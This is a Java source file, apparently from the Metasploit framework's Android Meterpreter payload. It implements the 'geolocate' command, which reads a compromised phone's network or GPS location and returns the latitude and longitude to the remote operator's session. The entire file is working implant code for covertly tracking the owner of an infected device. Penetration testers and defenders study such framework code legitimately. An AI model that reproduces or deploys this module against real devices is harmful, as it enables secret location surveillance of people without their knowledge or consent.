package com.metasploit.meterpreter.android;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Bundle;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class geolocate implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_GEO_LAT = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9011);
    private static final int TLV_TYPE_GEO_LONG = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9012);

    // stubbed listener (so we can wait for the gps on the main thread)
    private class MyLocationListener implements LocationListener {
        @Override
        public void onLocationChanged(Location loc) {}

        @Override
        public void onProviderDisabled(String provider) {}

        @Override
        public void onProviderEnabled(String provider) {}

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}
    }

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
            TLVPacket response) throws Exception {

        LocationManager locationManager;
        locationManager = (LocationManager) AndroidMeterpreter.getContext()
                .getSystemService(Context.LOCATION_SERVICE);

        Location location = locationManager
                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        if (location != null) {
            addLocationToResponse(location, response);
        } else {
            LocationListener listener = new MyLocationListener();
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener);

            long stop = System.nanoTime() + 1000000000*15; // 15 seconds
            while (System.nanoTime() < stop);

            locationManager.removeUpdates(listener);

            location = locationManager
                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (location != null) {
                addLocationToResponse(location, response);
                return ERROR_SUCCESS;
            } else {
                return ERROR_FAILURE;
            }
        }

        return ERROR_SUCCESS;
    }

    private void addLocationToResponse(Location location, TLVPacket response) {
        response.add(TLV_TYPE_GEO_LAT,
                Double.toString(location.getLatitude()));
        response.add(TLV_TYPE_GEO_LONG,
                Double.toString(location.getLongitude()));
    }

}
